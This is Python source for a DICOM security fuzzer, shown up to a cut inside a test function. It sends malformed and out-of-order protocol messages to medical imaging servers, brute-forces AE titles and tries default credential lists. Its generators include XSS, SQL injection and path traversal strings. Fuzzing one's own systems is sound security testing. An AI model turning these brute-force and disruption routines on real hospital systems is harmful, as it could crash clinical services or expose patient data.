#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-only
"""
DICOM Protocol Fuzzer v4.0 - Comprehensive Security Testing Suite

A production-grade fuzzer for extended DICOM security testing campaigns (100+ hours).
Designed for thorough edge case coverage and smart fuzzing strategies.

Key Features:
- State Machine Confusion: Exploit DICOM's stateful protocol
- Authentication Fuzzing: AE title brute force, User Identity credential attacks
- Deep Protocol Fuzzing: All PDU types, variable items, DIMSE commands
- Raw Byte Manipulation: Low-level protocol attacks
- Campaign Mode: Long-running fuzzing with statistics and crash detection
- Wordlist Support: Dictionary attacks for AE titles and credentials

Architecture:
- Modular fuzzer classes for each attack category
- Persistent statistics and crash logging
- Configurable intensity and duration
- Smart mutation strategies based on protocol knowledge

Usage:
    # Quick association fuzzing
    python dicom_fuzzer.py --ip 127.0.0.1 --port 4242 --ae-title ORTHANC --mode association

    # AE title brute force with wordlist
    python dicom_fuzzer.py --ip 127.0.0.1 --port 4242 --ae-title ORTHANC --mode auth \\
        --ae-wordlist wordlists/ae_titles.txt

    # Full campaign (long-running)
    python dicom_fuzzer.py --ip 127.0.0.1 --port 4242 --ae-title ORTHANC --mode campaign \\
        --duration 3600 --intensity high

    # State machine confusion
    python dicom_fuzzer.py --ip 127.0.0.1 --port 4242 --ae-title ORTHANC --mode state

    # All modes
    python dicom_fuzzer.py --ip 127.0.0.1 --port 4242 --ae-title ORTHANC --mode all --debug
"""

import argparse
import hashlib
import json
import logging
import os
import random
import signal
import socket
import struct
import sys
import threading
import time
import traceback
import urllib.request
from abc import ABC, abstractmethod
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum, auto
from pathlib import Path
from typing import Any, Callable, Dict, Generator, List, Optional, Set, Tuple, Union

# =============================================================================
# Path Setup and Imports
# =============================================================================

script_dir = os.path.dirname(os.path.abspath(__file__))
if script_dir not in sys.path:
    sys.path.insert(0, script_dir)

import warnings
warnings.filterwarnings('ignore')

try:
    import scapy.config
    scapy.config.conf.ipv6_enabled = False
except Exception:
    pass

from scapy.packet import Packet, fuzz
from scapy.volatile import RandShort, RandInt, RandString, RandBin

try:
    from dicom import (
        DICOMSocket,
        DICOM,
        A_ASSOCIATE_RQ,
        A_ASSOCIATE_AC,
        A_ASSOCIATE_RJ,
        A_ABORT,
        A_RELEASE_RQ,
        A_RELEASE_RP,
        P_DATA_TF,
        PresentationDataValueItem,
        DICOMVariableItem,
        DICOMApplicationContext,
        DICOMPresentationContextRQ,
        DICOMPresentationContextAC,
        DICOMAbstractSyntax,
        DICOMTransferSyntax,
        DICOMUserInformation,
        DICOMMaximumLength,
        DICOMImplementationClassUID,
        DICOMImplementationVersionName,
        DICOMAsyncOperationsWindow,
        DICOMSCPSCURoleSelection,
        DICOMUserIdentity,
        DICOMUserIdentityResponse,
        DIMSEPacket,
        C_ECHO_RQ,
        C_ECHO_RSP,
        C_STORE_RQ,
        C_STORE_RSP,
        C_FIND_RQ,
        C_FIND_RSP,
        C_MOVE_RQ,
        C_MOVE_RSP,
        C_GET_RQ,
        C_GET_RSP,
        DICOMUIDFieldRaw,
        DICOMUSField,
        DICOMULField,
        DICOMAEDIMSEField,
        DICOMElementField,
        build_presentation_context_rq,
        build_user_information,
        parse_dimse_status,
        APP_CONTEXT_UID,
        DEFAULT_TRANSFER_SYNTAX_UID,
        VERIFICATION_SOP_CLASS_UID,
        CT_IMAGE_STORAGE_SOP_CLASS_UID,
        PATIENT_ROOT_QR_FIND_SOP_CLASS_UID,
        PATIENT_ROOT_QR_MOVE_SOP_CLASS_UID,
        PATIENT_ROOT_QR_GET_SOP_CLASS_UID,
        STUDY_ROOT_QR_FIND_SOP_CLASS_UID,
        STUDY_ROOT_QR_MOVE_SOP_CLASS_UID,
        STUDY_ROOT_QR_GET_SOP_CLASS_UID,
        _uid_to_bytes,
        _uid_to_bytes_raw,
    )
except ImportError as e:
    print(f"ERROR: Could not import dicom module: {e}", file=sys.stderr)
    sys.exit(2)

# =============================================================================
# Logging Setup
# =============================================================================

log = logging.getLogger("dicom_fuzzer")

# =============================================================================
# Constants and Enums
# =============================================================================

class FuzzIntensity(Enum):
    LOW = auto()      # Quick sanity checks
    MEDIUM = auto()   # Standard fuzzing
    HIGH = auto()     # Thorough fuzzing
    EXTREME = auto()  # Maximum coverage (slow)


class CrashType(Enum):
    CONNECTION_REFUSED = auto()
    CONNECTION_RESET = auto()
    CONNECTION_TIMEOUT = auto()
    UNEXPECTED_CLOSE = auto()
    INVALID_RESPONSE = auto()
    NO_RESPONSE = auto()
    SERVER_ABORT = auto()
    PROTOCOL_ERROR = auto()


# PDU Types
PDU_TYPE_ASSOCIATE_RQ = 0x01
PDU_TYPE_ASSOCIATE_AC = 0x02
PDU_TYPE_ASSOCIATE_RJ = 0x03
PDU_TYPE_P_DATA_TF = 0x04
PDU_TYPE_RELEASE_RQ = 0x05
PDU_TYPE_RELEASE_RP = 0x06
PDU_TYPE_ABORT = 0x07

# DIMSE Command Fields
DIMSE_C_STORE_RQ = 0x0001
DIMSE_C_STORE_RSP = 0x8001
DIMSE_C_GET_RQ = 0x0010
DIMSE_C_GET_RSP = 0x8010
DIMSE_C_FIND_RQ = 0x0020
DIMSE_C_FIND_RSP = 0x8020
DIMSE_C_MOVE_RQ = 0x0021
DIMSE_C_MOVE_RSP = 0x8021
DIMSE_C_ECHO_RQ = 0x0030
DIMSE_C_ECHO_RSP = 0x8030
DIMSE_C_CANCEL_RQ = 0x0FFF
DIMSE_N_EVENT_REPORT_RQ = 0x0100
DIMSE_N_EVENT_REPORT_RSP = 0x8100
DIMSE_N_GET_RQ = 0x0110
DIMSE_N_GET_RSP = 0x8110
DIMSE_N_SET_RQ = 0x0120
DIMSE_N_SET_RSP = 0x8120
DIMSE_N_ACTION_RQ = 0x0130
DIMSE_N_ACTION_RSP = 0x8130
DIMSE_N_CREATE_RQ = 0x0140
DIMSE_N_CREATE_RSP = 0x8140
DIMSE_N_DELETE_RQ = 0x0150
DIMSE_N_DELETE_RSP = 0x8150

# Item Types
ITEM_TYPE_APP_CONTEXT = 0x10
ITEM_TYPE_PRES_CTX_RQ = 0x20
ITEM_TYPE_PRES_CTX_AC = 0x21
ITEM_TYPE_ABSTRACT_SYNTAX = 0x30
ITEM_TYPE_TRANSFER_SYNTAX = 0x40
ITEM_TYPE_USER_INFO = 0x50
ITEM_TYPE_MAX_LENGTH = 0x51
ITEM_TYPE_IMPL_CLASS_UID = 0x52
ITEM_TYPE_ASYNC_OPS = 0x53
ITEM_TYPE_ROLE_SELECTION = 0x54
ITEM_TYPE_IMPL_VERSION = 0x55
ITEM_TYPE_SOP_EXT_NEG = 0x56
ITEM_TYPE_SOP_COMMON_EXT = 0x57
ITEM_TYPE_USER_IDENTITY = 0x58
ITEM_TYPE_USER_IDENTITY_RSP = 0x59

# Common SOP Class UIDs for fuzzing
COMMON_SOP_CLASSES = [
    VERIFICATION_SOP_CLASS_UID,
    CT_IMAGE_STORAGE_SOP_CLASS_UID,
    "1.2.840.10008.5.1.4.1.1.7",    # Secondary Capture
    "1.2.840.10008.5.1.4.1.1.1",    # CR Image Storage
    "1.2.840.10008.5.1.4.1.1.1.1",  # Digital X-Ray
    "1.2.840.10008.5.1.4.1.1.4",    # MR Image Storage
    "1.2.840.10008.5.1.4.1.1.12.1", # X-Ray Angiographic
    "1.2.840.10008.5.1.4.1.1.88.11", # Basic Text SR
    PATIENT_ROOT_QR_FIND_SOP_CLASS_UID,
    PATIENT_ROOT_QR_MOVE_SOP_CLASS_UID,
    STUDY_ROOT_QR_FIND_SOP_CLASS_UID,
]

# Common Transfer Syntaxes
COMMON_TRANSFER_SYNTAXES = [
    DEFAULT_TRANSFER_SYNTAX_UID,                 # Implicit VR Little Endian
    "1.2.840.10008.1.2.1",                       # Explicit VR Little Endian
    "1.2.840.10008.1.2.2",                       # Explicit VR Big Endian
    "1.2.840.10008.1.2.4.50",                    # JPEG Baseline
    "1.2.840.10008.1.2.4.70",                    # JPEG Lossless
    "1.2.840.10008.1.2.4.90",                    # JPEG 2000 Lossless
    "1.2.840.10008.1.2.5",                       # RLE Lossless
]

# Default AE titles to try
DEFAULT_AE_TITLES = [
    "ORTHANC", "DCM4CHEE", "PACS", "STORE", "ANY-SCP", "DICOM",
    "ARCHIVE", "QUERY", "MOVE", "STORAGE", "FINDSCP", "STORESCU",
    "ECHOSCP", "ECHOSCU", "MOVESCU", "STORESCP", "WADO", "QIDO",
    "DICOMWEB", "CONQUEST", "HOROS", "OSIRIX", "RADIANT",
    "CLEARCANVAS", "K-PACS", "SYNAPSE", "AGFA", "FUJI", "GE",
    "SIEMENS", "PHILIPS", "TOSHIBA", "CANON", "CARESTREAM",
]

# Common usernames for auth fuzzing
DEFAULT_USERNAMES = [
    "admin", "root", "dicom", "pacs", "user", "guest", "test",
    "service", "system", "operator", "clinician", "radiology",
    "technician", "physician", "nurse", "administrator",
]

# Common passwords for auth fuzzing
DEFAULT_PASSWORDS = [
    "admin", "password", "123456", "dicom", "pacs", "guest",
    "test", "changeme", "default", "welcome", "letmein",
    "password123", "admin123", "root", "pass", "1234",
]

# =============================================================================
# Data Classes
# =============================================================================

@dataclass
class FuzzResult:
    """Result of a single fuzz test."""
    test_name: str
    test_category: str
    success: bool
    crash_detected: bool = False
    crash_type: Optional[CrashType] = None
    response_type: Optional[str] = None
    error_message: Optional[str] = None
    duration_ms: float = 0.0
    raw_request: Optional[bytes] = None
    raw_response: Optional[bytes] = None
    notes: str = ""


@dataclass
class FuzzStatistics:
    """Statistics for a fuzzing session."""
    total_tests: int = 0
    passed: int = 0
    failed: int = 0
    crashes: int = 0
    timeouts: int = 0
    connection_errors: int = 0
    start_time: float = field(default_factory=time.time)
    end_time: Optional[float] = None
    crash_hashes: Set[str] = field(default_factory=set)
    results_by_category: Dict[str, Dict[str, int]] = field(default_factory=lambda: defaultdict(lambda: {"passed": 0, "failed": 0, "crashes": 0}))
    
    def record(self, result: FuzzResult) -> None:
        self.total_tests += 1
        if result.crash_detected:
            self.crashes += 1
            self.results_by_category[result.test_category]["crashes"] += 1
        elif result.success:
            self.passed += 1
            self.results_by_category[result.test_category]["passed"] += 1
        else:
            self.failed += 1
            self.results_by_category[result.test_category]["failed"] += 1
    
    def summary(self) -> str:
        elapsed = (self.end_time or time.time()) - self.start_time
        rate = self.total_tests / max(elapsed, 1)
        return (
            f"=== Fuzzing Statistics ===\n"
            f"Duration: {elapsed:.1f}s | Rate: {rate:.1f} tests/sec\n"
            f"Total: {self.total_tests} | Passed: {self.passed} | "
            f"Failed: {self.failed} | Crashes: {self.crashes}\n"
            f"Unique crashes: {len(self.crash_hashes)}\n"
            f"\nBy Category:\n" +
            "\n".join(f"  {cat}: {stats}" for cat, stats in self.results_by_category.items())
        )


@dataclass
class TargetConfig:
    """Configuration for the fuzzing target."""
    ip: str
    port: int
    ae_title: str
    calling_ae: str = "FUZZ_SCU"
    timeout: int = 10
    max_pdu_length: int = 16384


# =============================================================================
# Utility Functions
# =============================================================================

def create_raw_pdu(pdu_type: int, payload: bytes) -> bytes:
    """Create a raw PDU with header."""
    return struct.pack("!BBi", pdu_type, 0, len(payload)) + payload


def mutate_bytes(data: bytes, mutations: List[Tuple[int, bytes]]) -> bytes:
    """Apply multiple mutations to bytes."""
    result = bytearray(data)
    for offset, value in mutations:
        if 0 <= offset < len(result):
            end = min(offset + len(value), len(result))
            result[offset:end] = value[:end - offset]
    return bytes(result)


def random_bit_flip(data: bytes, num_flips: int = 1) -> bytes:
    """Flip random bits in data."""
    result = bytearray(data)
    for _ in range(num_flips):
        if result:
            idx = random.randint(0, len(result) - 1)
            bit = random.randint(0, 7)
            result[idx] ^= (1 << bit)
    return bytes(result)


def random_byte_insert(data: bytes, num_inserts: int = 1) -> bytes:
    """Insert random bytes at random positions."""
    result = bytearray(data)
    for _ in range(num_inserts):
        pos = random.randint(0, len(result))
        result.insert(pos, random.randint(0, 255))
    return bytes(result)


def random_byte_delete(data: bytes, num_deletes: int = 1) -> bytes:
    """Delete random bytes from data."""
    result = bytearray(data)
    for _ in range(min(num_deletes, len(result))):
        if result:
            pos = random.randint(0, len(result) - 1)
            del result[pos]
    return bytes(result)


def generate_random_uid() -> str:
    """Generate a random DICOM UID."""
    components = [str(random.randint(0, 99999)) for _ in range(random.randint(3, 8))]
    return "1.2." + ".".join(components)


def generate_malformed_uid() -> bytes:
    """Generate intentionally malformed UIDs."""
    strategies = [
        lambda: b"",                                      # Empty
        lambda: b"\x00" * 16,                             # Null bytes
        lambda: b"A" * 64,                                # All alpha (invalid)
        lambda: b"1.2.3." + b"9" * 100,                   # Very long
        lambda: b"1.2..3.4",                              # Double dots
        lambda: b".1.2.3.4",                              # Leading dot
        lambda: b"1.2.3.4.",                              # Trailing dot
        lambda: b"1.2.3.4\x00" + b"extra",                # Null in middle
        lambda: generate_random_uid().encode()[:random.randint(3, 10)],  # Truncated
        lambda: b"-1.2.3.4",                              # Negative
        lambda: b"1.2.3." + bytes([random.randint(128, 255)]),  # High bytes
    ]
    return random.choice(strategies)()


def generate_random_ae_title(valid: bool = False) -> bytes:
    """Generate random AE title."""
    if valid:
        length = random.randint(1, 16)
        chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
        return "".join(random.choice(chars) for _ in range(length)).encode().ljust(16)
    
    strategies = [
        lambda: b"",                                    # Empty
        lambda: b"\x00" * 16,                           # Null
        lambda: b" " * 16,                              # All spaces
        lambda: b"A" * 64,                              # Too long
        lambda: bytes(random.randint(0, 255) for _ in range(16)),  # Random bytes
        lambda: b"\xff" * 16,                           # High bytes
        lambda: b"AE\x00TITLE" + b"\x00" * 8,           # Null in middle
        lambda: b"<script>alert(1)</script>",           # XSS attempt
        lambda: b"'; DROP TABLE--",                     # SQL injection
        lambda: b"../../../etc/passwd",                 # Path traversal
    ]
    return random.choice(strategies)()


def hash_crash(request: bytes, error: str) -> str:
    """Generate a hash for deduplicating crashes."""
    content = request[:100] + error.encode()[:100]
    return hashlib.md5(content).hexdigest()[:16]


def load_wordlist(filepath: str) -> List[str]:
    """Load wordlist from file."""
    if not os.path.exists(filepath):
        log.warning(f"Wordlist not found: {filepath}")
        return []
    
    with open(filepath, 'r', errors='ignore') as f:
        return [line.strip() for line in f if line.strip() and not line.startswith('#')]


def create_minimal_dataset(sop_class_uid: str = None, sop_instance_uid: str = None,
                          add_junk: bool = False) -> bytes:
    """Create minimal DICOM dataset bytes."""
    sop_class = (sop_class_uid or CT_IMAGE_STORAGE_SOP_CLASS_UID).encode()
    if len(sop_class) % 2:
        sop_class += b"\x00"
    
    sop_inst = (sop_instance_uid or generate_random_uid()).encode()
    if len(sop_inst) % 2:
        sop_inst += b"\x00"
    
    elements = []
    # SOPClassUID (0008,0016)
    elements.append(struct.pack("<HHI", 0x0008, 0x0016, len(sop_class)) + sop_class)
    # SOPInstanceUID (0008,0018)
    elements.append(struct.pack("<HHI", 0x0008, 0x0018, len(sop_inst)) + sop_inst)
    # StudyInstanceUID (0020,000D)
    study_uid = b"1.2.3.4.5.6.7.8.9.10"
    if len(study_uid) % 2:
        study_uid += b"\x00"
    elements.append(struct.pack("<HHI", 0x0020, 0x000D, len(study_uid)) + study_uid)
    # SeriesInstanceUID (0020,000E)
    series_uid = b"1.2.3.4.5.6.7.8.9.11"
    if len(series_uid) % 2:
        series_uid += b"\x00"
    elements.append(struct.pack("<HHI", 0x0020, 0x000E, len(series_uid)) + series_uid)
    
    if add_junk:
        # Add random junk elements
        for _ in range(random.randint(1, 10)):
            tag_g = random.randint(0x0008, 0x7FFF)
            tag_e = random.randint(0x0000, 0xFFFF)
            junk = bytes(random.randint(0, 255) for _ in range(random.randint(0, 100)))
            if len(junk) % 2:
                junk += b"\x00"
            elements.append(struct.pack("<HHI", tag_g, tag_e, len(junk)) + junk)
    
    return b"".join(elements)


# =============================================================================
# Low-Level Socket Connection
# =============================================================================

class RawDICOMConnection:
    """Low-level DICOM connection for raw byte manipulation."""
    
    def __init__(self, target: TargetConfig):
        self.target = target
        self.sock: Optional[socket.socket] = None
    
    def connect(self) -> bool:
        """Establish TCP connection."""
        try:
            self.sock = socket.create_connection(
                (self.target.ip, self.target.port),
                timeout=self.target.timeout
            )
            return True
        except (socket.error, socket.timeout, OSError) as e:
            log.debug(f"Connection failed: {e}")
            return False
    
    def send_raw(self, data: bytes) -> bool:
        """Send raw bytes."""
        if not self.sock:
            return False
        try:
            self.sock.sendall(data)
            return True
        except (socket.error, BrokenPipeError) as e:
            log.debug(f"Send failed: {e}")
            return False
    
    def recv_raw(self, size: int = 65536, timeout: float = None) -> Optional[bytes]:
        """Receive raw bytes."""
        if not self.sock:
            return None
        try:
            if timeout:
                self.sock.settimeout(timeout)
            return self.sock.recv(size)
        except socket.timeout:
            return None
        except (socket.error, OSError) as e:
            log.debug(f"Recv failed: {e}")
            return None
        finally:
            if timeout:
                self.sock.settimeout(self.target.timeout)
    
    def recv_pdu(self, timeout: float = None) -> Optional[Tuple[int, bytes]]:
        """Receive a complete PDU."""
        header = self.recv_raw(6, timeout)
        if not header or len(header) < 6:
            return None
        
        pdu_type = header[0]
        pdu_length = struct.unpack("!I", header[2:6])[0]
        
        # Sanity check length
        if pdu_length > 10 * 1024 * 1024:  # 10MB max
            return (pdu_type, header)
        
        payload = b""
        remaining = pdu_length
        while remaining > 0:
            chunk = self.recv_raw(min(remaining, 65536), timeout)
            if not chunk:
                break
            payload += chunk
            remaining -= len(chunk)
        
        return (pdu_type, header + payload)
    
    def close(self) -> None:
        """Close connection."""
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None
    
    def __enter__(self):
        return self
    
    def __exit__(self, *args):
        self.close()


# =============================================================================
# Base Fuzzer Class
# =============================================================================

class BaseFuzzer(ABC):
    """Base class for all fuzzers."""
    
    def __init__(self, target: TargetConfig, intensity: FuzzIntensity = FuzzIntensity.MEDIUM):
        self.target = target
        self.intensity = intensity
        self.stats = FuzzStatistics()
        self.stop_requested = False
    
    @abstractmethod
    def get_test_generators(self) -> List[Tuple[str, Callable[[], Generator[FuzzResult, None, None]]]]:
        """Return list of (name, generator_function) tuples."""
        pass
    
    def run(self, max_tests: int = None, duration: float = None) -> FuzzStatistics:
        """Run fuzzing tests."""
        start_time = time.time()
        test_count = 0
        
        generators = self.get_test_generators()
        
        while not self.stop_requested:
            for name, gen_func in generators:
                if self.stop_requested:
                    break
                
                try:
                    for result in gen_func():
                        if self.stop_requested:
                            break
                        
                        self.stats.record(result)
                        test_count += 1
                        
                        if result.crash_detected and result.raw_request:
                            crash_hash = hash_crash(result.raw_request, result.error_message or "")
                            self.stats.crash_hashes.add(crash_hash)
                            log.warning(f"CRASH [{crash_hash}]: {result.test_name} - {result.error_message}")
                        
                        if max_tests and test_count >= max_tests:
                            self.stop_requested = True
                            break
                        
                        if duration and (time.time() - start_time) >= duration:
                            self.stop_requested = True
                            break
                
                except Exception as e:
                    log.error(f"Error in {name}: {e}")
                    if log.isEnabledFor(logging.DEBUG):
                        traceback.print_exc()
            
            # If we've gone through all generators once, check if we should continue
            if max_tests is None and duration is None:
                break  # Single pass mode
        
        self.stats.end_time = time.time()
        return self.stats
    
    def stop(self) -> None:
        """Request stop."""
        self.stop_requested = True
    
    def _create_connection(self) -> RawDICOMConnection:
        """Create a new connection."""
        return RawDICOMConnection(self.target)
    
    def _send_and_check(self, conn: RawDICOMConnection, data: bytes,
                        test_name: str, category: str) -> FuzzResult:
        """Send data and analyze response."""
        start = time.time()
        raw_response = None
        
        try:
            if not conn.send_raw(data):
                return FuzzResult(
                    test_name=test_name,
                    test_category=category,
                    success=False,
                    crash_detected=True,
                    crash_type=CrashType.CONNECTION_RESET,
                    error_message="Send failed",
                    raw_request=data,
                    duration_ms=(time.time() - start) * 1000
                )
            
            response = conn.recv_pdu(timeout=min(self.target.timeout, 5))
            
            if response is None:
                return FuzzResult(
                    test_name=test_name,
                    test_category=category,
                    success=True,  # No response might be expected
                    crash_detected=False,
                    response_type="NO_RESPONSE",
                    raw_request=data,
                    duration_ms=(time.time() - start) * 1000
                )
            
            pdu_type, raw_response = response
            
            response_types = {
                0x01: "A-ASSOCIATE-RQ",
                0x02: "A-ASSOCIATE-AC",
                0x03: "A-ASSOCIATE-RJ",
                0x04: "P-DATA-TF",
                0x05: "A-RELEASE-RQ",
                0x06: "A-RELEASE-RP",
                0x07: "A-ABORT",
            }
            
            return FuzzResult(
                test_name=test_name,
                test_category=category,
                success=True,
                crash_detected=False,
                response_type=response_types.get(pdu_type, f"UNKNOWN_0x{pdu_type:02X}"),
                raw_request=data,
                raw_response=raw_response,
                duration_ms=(time.time() - start) * 1000
            )
        
        except socket.timeout:
            return FuzzResult(
                test_name=test_name,
                test_category=category,
                success=True,
                crash_detected=False,
                response_type="TIMEOUT",
                raw_request=data,
                duration_ms=(time.time() - start) * 1000
            )
        
        except (ConnectionResetError, BrokenPipeError) as e:
            return FuzzResult(
                test_name=test_name,
                test_category=category,
                success=False,
                crash_detected=True,
                crash_type=CrashType.CONNECTION_RESET,
                error_message=str(e),
                raw_request=data,
                duration_ms=(time.time() - start) * 1000
            )
        
        except Exception as e:
            return FuzzResult(
                test_name=test_name,
                test_category=category,
                success=False,
                error_message=str(e),
                raw_request=data,
                duration_ms=(time.time() - start) * 1000
            )


# =============================================================================
# State Machine Confusion Fuzzer
# =============================================================================

class StateMachineFuzzer(BaseFuzzer):
    """
    Exploits DICOM's stateful protocol by sending PDUs in unexpected orders.
    
    DICOM State Machine (simplified):
    1. Sta1: Idle (waiting for connection)
    2. Sta2: Transport connected (waiting for A-ASSOCIATE-RQ)
    3. Sta5: Association established (waiting for P-DATA, A-RELEASE, A-ABORT)
    4. Sta6: Association established (can send/receive)
    5. Sta7: Release requested
    ...
    
    Attacks:
    - Send data before association
    - Send multiple association requests
    - Send release without association
    - Send data during release
    - Interleave different operations
    """
    
    def get_test_generators(self) -> List[Tuple[str, Callable]]:
        return [
            ("pre_association_attacks", self._pre_association_attacks),
            ("association_state_attacks", self._association_state_attacks),
            ("release_state_attacks", self._release_state_attacks),
            ("abort_state_attacks", self._abort_state_attacks),
            ("interleaved_operations", self._interleaved_operations),
            ("rapid_state_transitions", self._rapid_state_transitions),
        ]
    
    def _build_valid_associate_rq(self) -> bytes:
        """Build a valid A-ASSOCIATE-RQ for state testing."""
        app_ctx = DICOMVariableItem() / DICOMApplicationContext()
        pctx = build_presentation_context_rq(1, VERIFICATION_SOP_CLASS_UID, [DEFAULT_TRANSFER_SYNTAX_UID])
        user_info = build_user_information(max_pdu_length=self.target.max_pdu_length)
        
        assoc_rq = DICOM() / A_ASSOCIATE_RQ(
            called_ae_title=self.target.ae_title,
            calling_ae_title=self.target.calling_ae,
            variable_items=[app_ctx, pctx, user_info]
        )
        return bytes(assoc_rq)
    
    def _build_echo_pdata(self, ctx_id: int = 1) -> bytes:
        """Build P-DATA with C-ECHO."""
        dimse = C_ECHO_RQ(message_id=random.randint(1, 65535))
        pdv = PresentationDataValueItem(
            context_id=ctx_id,
            data=bytes(dimse),
            is_command=1,
            is_last=1
        )
        return bytes(DICOM() / P_DATA_TF(pdv_items=[pdv]))
    
    def _pre_association_attacks(self) -> Generator[FuzzResult, None, None]:
        """Send various PDUs before association is established."""
        category = "state_pre_association"
        
        # Test 1: P-DATA before association
        with self._create_connection() as conn:
            if conn.connect():
                pdata = self._build_echo_pdata()
                yield self._send_and_check(conn, pdata, "pdata_before_association", category)
        
        # Test 2: A-RELEASE-RQ before association
        with self._create_connection() as conn:
            if conn.connect():
                release = bytes(DICOM() / A_RELEASE_RQ())
                yield self._send_and_check(conn, release, "release_before_association", category)
        
        # Test 3: A-RELEASE-RP before association
        with self._create_connection() as conn:
            if conn.connect():
                release_rp = bytes(DICOM() / A_RELEASE_RP())
                yield self._send_and_check(conn, release_rp, "release_rp_before_association", category)
        
        # Test 4: A-ASSOCIATE-AC before request
        with self._create_connection() as conn:
            if conn.connect():
                ac = bytes(DICOM() / A_ASSOCIATE_AC(
                    called_ae_title=self.target.ae_title,
                    calling_ae_title=self.target.calling_ae
                ))
                yield self._send_and_check(conn, ac, "associate_ac_unsolicited", category)
        
        # Test 5: A-ASSOCIATE-RJ before request
        with self._create_connection() as conn:
            if conn.connect():
                rj = bytes(DICOM() / A_ASSOCIATE_RJ(result=1, source=1, reason_diag=1))
                yield self._send_and_check(conn, rj, "associate_rj_unsolicited", category)
        
        # Test 6: Random garbage before anything
        with self._create_connection() as conn:
            if conn.connect():
                garbage = bytes(random.randint(0, 255) for _ in range(random.randint(1, 1000)))
                yield self._send_and_check(conn, garbage, "garbage_before_association", category)
    
    def _association_state_attacks(self) -> Generator[FuzzResult, None, None]:
        """Attack during association negotiation."""
        category = "state_association"
        
        # Test 1: Double A-ASSOCIATE-RQ
        with self._create_connection() as conn:
            if conn.connect():
                assoc = self._build_valid_associate_rq()
                conn.send_raw(assoc)
                conn.recv_pdu(timeout=2)
                # Send another association request
                yield self._send_and_check(conn, assoc, "double_associate_rq", category)
        
        # Test 2: Association request during data transfer
        with self._create_connection() as conn:
            if conn.connect():
                assoc = self._build_valid_associate_rq()
                conn.send_raw(assoc)
                resp = conn.recv_pdu(timeout=3)
                if resp and resp[0] == PDU_TYPE_ASSOCIATE_AC:
                    # Send another association request during established session
                    yield self._send_and_check(conn, assoc, "associate_rq_during_session", category)
        
        # Test 3: Nested association attempt
        with self._create_connection() as conn:
            if conn.connect():
                assoc = self._build_valid_associate_rq()
                conn.send_raw(assoc)
                conn.recv_pdu(timeout=2)
                # Try different AE title
                assoc2 = bytes(DICOM() / A_ASSOCIATE_RQ(
                    called_ae_title="OTHER_AE",
                    calling_ae_title=self.target.calling_ae,
                    variable_items=[DICOMVariableItem() / DICOMApplicationContext()]
                ))
                yield self._send_and_check(conn, assoc2, "nested_association_different_ae", category)
        
        # Test 4: Fragmented association request
        with self._create_connection() as conn:
            if conn.connect():
                assoc = self._build_valid_associate_rq()
                # Send header only
                conn.send_raw(assoc[:6])
                time.sleep(0.1)
                # Send rest
                result = self._send_and_check(conn, assoc[6:], "fragmented_associate_rq", category)
                yield result
    
    def _release_state_attacks(self) -> Generator[FuzzResult, None, None]:
        """Attack during release phase."""
        category = "state_release"
        
        # Test 1: Data during release
        with self._create_connection() as conn:
            if conn.connect():
                conn.send_raw(self._build_valid_associate_rq())
                resp = conn.recv_pdu(timeout=3)
                if resp and resp[0] == PDU_TYPE_ASSOCIATE_AC:
                    # Send release request
                    conn.send_raw(bytes(DICOM() / A_RELEASE_RQ()))
                    # Immediately send data
                    pdata = self._build_echo_pdata()
                    yield self._send_and_check(conn, pdata, "pdata_during_release", category)
        
        # Test 2: Multiple release requests
        with self._create_connection() as conn:
            if conn.connect():
                conn.send_raw(self._build_valid_associate_rq())
                resp = conn.recv_pdu(timeout=3)
                if resp and resp[0] == PDU_TYPE_ASSOCIATE_AC:
                    release = bytes(DICOM() / A_RELEASE_RQ())
                    conn.send_raw(release)
                    yield self._send_and_check(conn, release, "double_release_rq", category)
        
        # Test 3: Release response without request
        with self._create_connection() as conn:
            if conn.connect():
                conn.send_raw(self._build_valid_associate_rq())
                resp = conn.recv_pdu(timeout=3)
                if resp and resp[0] == PDU_TYPE_ASSOCIATE_AC:
                    release_rp = bytes(DICOM() / A_RELEASE_RP())
                    yield self._send_and_check(conn, release_rp, "release_rp_without_rq", category)
        
        # Test 4: Associate after release
        with self._create_connection() as conn:
            if conn.connect():
                assoc = self._build_valid_associate_rq()
                conn.send_raw(assoc)
                resp = conn.recv_pdu(timeout=3)
                if resp and resp[0] == PDU_TYPE_ASSOCIATE_AC:
                    conn.send_raw(bytes(DICOM() / A_RELEASE_RQ()))
                    conn.recv_pdu(timeout=2)
                    # Try to associate again on same connection
                    yield self._send_and_check(conn, assoc, "associate_after_release", category)
    
    def _abort_state_attacks(self) -> Generator[FuzzResult, None, None]:
        """Attack using A-ABORT in various states."""
        category = "state_abort"
        
        # Test 1: Abort before association
        with self._create_connection() as conn:
            if conn.connect():
                abort = bytes(DICOM() / A_ABORT(source=0, reason_diag=0))
                yield self._send_and_check(conn, abort, "abort_before_association", category)
        
        # Test 2: Multiple aborts
        with self._create_connection() as conn:
            if conn.connect():
                conn.send_raw(self._build_valid_associate_rq())
                conn.recv_pdu(timeout=2)
                abort = bytes(DICOM() / A_ABORT(source=0, reason_diag=0))
                conn.send_raw(abort)
                yield self._send_and_check(conn, abort, "double_abort", category)
        
        # Test 3: Data after abort
        with self._create_connection() as conn:
            if conn.connect():
                conn.send_raw(self._build_valid_associate_rq())
                resp = conn.recv_pdu(timeout=3)
                if resp and resp[0] == PDU_TYPE_ASSOCIATE_AC:
                    conn.send_raw(bytes(DICOM() / A_ABORT(source=0, reason_diag=0)))
                    pdata = self._build_echo_pdata()
                    yield self._send_and_check(conn, pdata, "pdata_after_abort", category)
        
        # Test 4: All abort reason codes
        for source in range(4):
            for reason in range(8):
                with self._create_connection() as conn:
                    if conn.connect():
                        conn.send_raw(self._build_valid_associate_rq())
                        conn.recv_pdu(timeout=2)
                        abort = bytes(DICOM() / A_ABORT(source=source, reason_diag=reason))
                        yield self._send_and_check(conn, abort, f"abort_src{source}_rsn{reason}", category)
    
    def _interleaved_operations(self) -> Generator[FuzzResult, None, None]:
        """Interleave different DIMSE operations unexpectedly."""
        category = "state_interleaved"
        
        # Test 1: Multiple commands without waiting for responses
        with self._create_connection() as conn:
            if conn.connect():
                conn.send_raw(self._build_valid_associate_rq())
                resp = conn.recv_pdu(timeout=3)
                if resp and resp[0] == PDU_TYPE_ASSOCIATE_AC:
                    # Send multiple C-ECHOs rapidly
                    for i in range(10):
                        pdata = self._build_echo_pdata()
                        conn.send_raw(pdata)
